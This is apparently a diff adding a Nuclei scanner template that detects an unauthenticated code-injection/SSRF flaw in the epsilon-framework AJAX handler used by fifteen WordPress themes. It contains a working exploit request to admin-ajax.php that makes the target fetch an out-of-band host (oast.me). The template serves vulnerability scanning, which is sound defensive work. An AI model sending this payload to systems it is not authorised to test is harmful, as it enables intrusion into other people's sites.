@@ -1,0 +1,40 @@
+id: wp-multiple-theme-ssrf
+
+info:
+  name: WordPress Themes - Code Injection
+  author: madrobot
+  severity: critical
+  description: Fifteen WordPress themes are susceptible to code injection using a version of epsilon-framework, due to lack of capability and CSRF nonce checks in AJAX actions.
+  reference:
+    - https://www.exploit-db.com/exploits/49327
+    - https://wpscan.com/vulnerability/10417
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.8
+    cwe-id: CWE-94
+  metadata:
+    max-request: 1
+  tags: wordpress,rce,ssrf,edb,wpscan
+
+http:
+  - raw:
+      - |
+        POST /wp-admin/admin-ajax.php?action=action_name HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+        action=epsilon_framework_ajax_action&args%5Baction%5D%5B%5D=Requests&args%5Baction%5D%5B%5D=request_multiple&args%5Bargs%5D%5B0%5D%5Burl%5D=https://oast.me/
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "Interactsh Server"
+          - "protocol_version"
+
+      - type: status
+        status:
+          - 200
+
+# digest: 490a0046304402205c4a1ee6509152e62b66d9cf422ce2718c10051a3c0042798f8df92507f2e3e102205d45d887511b490004ed81eb5e135a628b5d248f36947297ccce054f6e6d9607:922c64590222798bb761d5b6d8e72950
